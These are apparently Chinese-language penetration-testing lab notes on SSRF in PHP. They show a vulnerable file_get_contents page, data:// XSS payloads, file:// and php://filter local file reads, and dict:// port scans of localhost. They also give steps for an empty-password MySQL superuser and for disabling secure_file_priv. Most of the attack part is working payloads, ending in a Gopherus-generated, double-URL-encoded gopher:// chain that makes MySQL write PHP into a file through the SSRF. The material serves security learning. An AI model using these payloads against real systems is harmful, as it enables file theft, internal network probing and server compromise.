
## file_get_contents()
有回顯得SSRF
```
<?php


    $filename = $_GET['file'];

    $str = file_get_contents($filename);
    echo $str;


?>
```

### file_get_contents()函式在 PHP 中支援以下幾種協議：
* 注意不支持 dict 協議

1. `http://` 或 `https://`: 用於從遠端的 HTTP 或 HTTPS 伺服器讀取資料。
2. `ftp://`: 用於從遠端的 FTP 伺服器讀取資料。
3. `ftps://`: 用於從遠端的加密 FTP 伺服器（通常使用 SSL/TLS）讀取資料。
4. `file://`: 用於讀取本地檔案系統中的檔案資料。
5. `php://`: 用於訪問各種內建的 I/O 資源，例如 `php://input` 用於讀取 `POST` 請求的原始資料，`php://stdin` 用於讀取標準輸入等。


data://偽協議可以使用，但是只是單純字串，並不會被解釋為PHP

```
data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=
碼後得到的是 <?php phpinfo(); ?>。
```
然而，解碼後的結果只是一個純粹的字串，並不會被當作 PHP 程式碼執行。這段解碼後的字串只會被當作純文字輸出，而不會被解釋為 PHP 程式碼。所以，phpinfo() 函式並不會被執行。


### 1.然而我們可以XSS
可以彈xss 並送給你的朋友
```
<script>alert('XSS Attack');</script>

因此，alert('XSS Attack'); 的 Base64 編碼為 

PHNjcmlwdD5hbGVydCgnWFNTIEF0dGFjaycpOzwvc2NyaXB0Pg==

data://text/plain;base64,PHNjcmlwdD5hbGVydCgnWFNTIEF0dGFjaycpOzwvc2NyaXB0Pg==
```

### 2.無法使用dict 能夠探測端口，只能用上面4個協議探測內網服務，或是php偽協議獲取本地文件
```
雖說只能用http https ftp ftps file 以及 php偽協議

無法使用dict 能夠探測端口，只能用上面4個協議探測內網服務，或是php偽協議獲取本地文件或是XSS


http://localhost/vul/ssrf/ssrf_fgc.php?file=file:///C:/Users/liar/Desktop/123.txt


http://localhost/vul/ssrf/ssrf_fgc.php?file=php://filter/read=convert.base64-encode/resource=file:///C:/Users/liar/Desktop/123.txt

```



## CURL

* cURL支持的通信协议有FTP、FTPS、HTTP、HTTPS、TFTP、SFTP、Gopher、SCP、Telnet、DICT、FILE、LDAP、LDAPS、IMAP、POP3、SMTP和RTSP。

* curl如果前面不输入协议会自动走http协议， 默认情况下，curl不会跟踪302跳转，并且curl不支持php的伪协议，不用考虑文件包含漏洞。

* 大部分的libcurl都不支持sftp协议，需要经过编译才能支持，所以一般这种探测都不会成功。
在 PHP 的 cURL 中，並不支援直接使用 sftp:// 協議，您需要使用 ssh2 擴充模組。這個擴充模組提供了對 SSH 和 SFTP 的支援，允許您與遠端伺服器進行安全的檔案傳輸。


### DICT協議掃描端口很好用
如果有echo 內容可以看到banner 或是判斷封包大小，來確任端口是否開啟。
```


http://localhost/vul/ssrf/ssrf_curl.php?url=dict://127.0.0.1:80

http://localhost/vul/ssrf/ssrf_curl.php?url=dict://127.0.0.1:3306

http://localhost/vul/ssrf/ssrf_curl.php?url=dict://127.0.0.1:22

```



## Gopher mysql 利用

Server version: 5.7.24
首先为了实验环境演示尽可能简单，mysql高于5.7需要关闭mysql tls，保证mysql为空密码，关闭tls方法如下

MySQL数据库用户认证采用的是挑战/应答的方式，服务器生成该挑战数(scramble)并发送给客户端，客户端用挑战数加密密码后返回相应结果，然后服务器检查是否与预期的结果相同，从而完成用户认证的过程。 登录时需要用服务器发来的scramble加密密码，但是当数据库用户密码为空时，加密后的密文也为空。

```sql
SHOW VARIABLES LIKE '%ssl%';
```
這條 SQL 查詢將返回一個結果集，其中包含了與 SSL/TLS 相關的變數。重要的是要查看幾個關鍵變數：

- `have_ssl`：如果顯示 `YES`，表示 MySQL 支援 SSL/TLS，即已啟用 TLS。如果顯示 `DISABLED`，表示未啟用 TLS。
- `have_openssl`：如果顯示 `YES`，表示 MySQL 使用 OpenSSL 函式庫進行 SSL/TLS 通訊。這通常是支援 TLS 的必要條件。
- `have_ssl_ca`：如果顯示 `YES`，表示 MySQL 已配置了 CA（Certificate Authority）證書，這是用於驗證 SSL/TLS 伺服器的身份。

或
```
SHOW STATUS LIKE 'Ssl_cipher';
```
如果這個值為空，則表示連線沒有使用 SSL/TLS，即 MySQL 伺服器未啟用 TLS



### 創建高權限空密碼帳號 
```
創建hack帳號 密碼為空。
CREATE USER 'hack'@'localhost' IDENTIFIED WITH 'mysql_native_password' BY '';


授予使用權限：

GRANT USAGE ON *.* TO 'hack'@'localhost';

授予全部權限：
GRANT ALL ON *.* TO 'hack'@'localhost';

```

### 查看 secure_file_priv 是否開啟

在 MySQL 中，`secure_file_priv` 是一個系統變數，用於限制使用 `LOAD DATA INFILE` 或 `LOAD DATA LOCAL INFILE` 這樣的 SQL 語句時，可以讀取的檔案的路徑。這是為了增加安全性，防止用戶隨意讀取和寫入檔案。

要查看 `secure_file_priv` 是否開啟，可以使用以下 SQL 命令：

```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```

執行上述 SQL 查詢後，您將看到類似以下的結果：

```
+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv | /path/to/directory/ |
+------------------+-------+
```
如果 `secure_file_priv` 的值是一個有效的路徑（例如 `/path/to/directory/`），表示 `secure_file_priv` 已開啟並限制 `LOAD DATA INFILE` 或 `LOAD DATA LOCAL INFILE` 的檔案路徑到指定的目錄下。

如果 `secure_file_priv` 的值是空（空字符串），表示 `secure_file_priv` 未啟用，這意味著 `LOAD DATA INFILE` 或 `LOAD DATA LOCAL INFILE` 可以讀取任何位置的檔案。

要關閉 `secure_file_priv`，可以將其設定為空值

```sql
SET GLOBAL secure_file_priv = '';
```
或者，您也可以在 MySQL 的配置文件（`my.cnf` 或 `my.ini`）中添加以下設定，以在 MySQL 伺服器重新啟動時保持設定：

```
secure_file_priv =
```
設定為空值後，請確保重新啟動 MySQL 伺服器以應用變更。

---



### 先用cmd 來測試一下 hack 空密碼帳戶能否寫入C槽。
```
C:\MAMP\bin\mysql\bin\mysql.exe -u hack -e "select '<?php phpinfo() ?>' into outfile  'C:/test.txt';"   
```

結果要根據情況，我mysql運行是adminstrators組的管理員，在UAC 預設情況下是寫不了的需要提升權限。

* 但UAC 調到最低可以直接寫入

## Gopher 利用


```bash=
└─$ python2 gopherus.py --exploit mysql                



  ________              .__
 /  _____/  ____ ______ |  |__   ___________ __ __  ______
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \
 \______  /\____/|   __/|___|  /\___  >__|  |____//____  >
        \/       |__|        \/     \/                 \/

                author: $_SpyD3r_$

For making it work username should not be password protected!!!

Give MySQL username: hack
Give query to execute: select '<?php phpinfo() ?>' into outfile  'C:/test.txt';

Your gopher link is ready to do SSRF : 

gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%68%61%63%6b%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%39%00%00%00%03%73%65%6c%65%63%74%20%27%3c%3f%70%68%70%20%70%68%70%69%6e%66%6f%28%29%20%3f%3e%27%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%20%27%43%3a%2f%74%65%73%74%2e%74%78%74%27%3b%01%00%00%00%01

-----------Made-by-SpyD3r-----------
                                                                                                                                                                                                                                         
┌──(kali㉿kali)-[~/Desktop/Gopherus]
└─$ 

```

### gopherus 工具
```
python2 gopherus.py --exploit mysql    

Give MySQL username: hack


Give query to execute: select '<?php phpinfo() ?>' into outfile  'C:/test.txt';


```
生成payload
```
gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%68%61%63%6b%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%39%00%00%00%03%73%65%6c%65%63%74%20%27%3c%3f%70%68%70%20%70%68%70%69%6e%66%6f%28%29%20%3f%3e%27%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%20%27%43%3a%2f%74%65%73%74%2e%74%78%74%27%3b%01%00%00%00%01
```


* _ 字符后面的内容还要 进行url编码。因为 PHP接收到POST或GET请求数据，自解码一次。

### 最終可以創建C:/test.txt
```
http://localhost/vul/ssrf/ssrf_curl.php?url=gopher://127.0.0.1:3306/_%25a3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2568%2561%2563%256b%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%2539%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%2527%253c%253f%2570%2568%2570%2520%2570%2568%2570%2569%256e%2566%256f%2528%2529%2520%253f%253e%2527%2520%2569%256e%2574%256f%2520%256f%2575%2574%2566%2569%256c%2565%2520%2520%2527%2543%253a%252f%2574%2565%2573%2574%252e%2574%2578%2574%2527%253b%2501%2500%2500%2500%2501
```